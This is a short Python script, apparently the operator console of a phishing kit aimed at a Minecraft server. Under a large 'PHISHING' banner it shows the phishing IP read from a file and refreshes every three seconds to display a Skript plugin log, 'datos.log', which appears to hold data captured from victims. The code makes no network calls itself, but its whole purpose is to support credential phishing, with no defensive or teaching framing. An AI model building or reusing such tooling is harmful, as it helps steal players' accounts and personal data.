##########
# Console
##########

import platform
import os
import re

from colorama import Fore, init
from time import sleep

init()

so = platform.system()

red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
reset = Fore.RESET

archivo_ip = open("ip_phishing.txt", "r")
ip = archivo_ip.read()
archivo_ip.close()

file = "plugins/Skript/logs/datos.log"

if so == "Windows":
    os.system("title Console")

def banner():
    print(f"\n\n{lred}    ██▓███   ██░ ██  ██▓  ██████  ██░ ██  ██▓ ███▄    █   ▄████ ")
    print("    ▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒")
    print("    ▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░")
    print(f"{white}    ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ ░██░▓██▒  ▐▌██▒░▓█  ██▓")
    print("    ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓░██░▒██░   ▓██░░▒▓███▀▒")
    print("    ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ")
    print("    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░░ ░░   ░ ▒░  ░   ░ ")
    print("    ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░   ░ ░ ░ ░   ░ ")
    print("            ░  ░  ░ ░        ░   ░  ░  ░ ░           ░       ░ \n\n")
    
def consola():
    banner()

    while True:
        sleep(3)

        if so == "Windows":

            os.system("cls")
        
        else:

            os.system("clear")

        banner()
        print(f"{white}     [{lgreen}√{white}]{white} IP: {lred}{str(ip)}")
        print(f"{lgreen}")

        if os.path.isfile(file):

            archivo_datos = open(file, "r", encoding="unicode_escape")
            contenido = archivo_datos.read()
            archivo_datos.close()

            contenido = re.sub(r"\d\d/\d\d/\d\d \d\d:\d\d", "", contenido)
            print(contenido.replace("[]     [", "     ["))

consola()
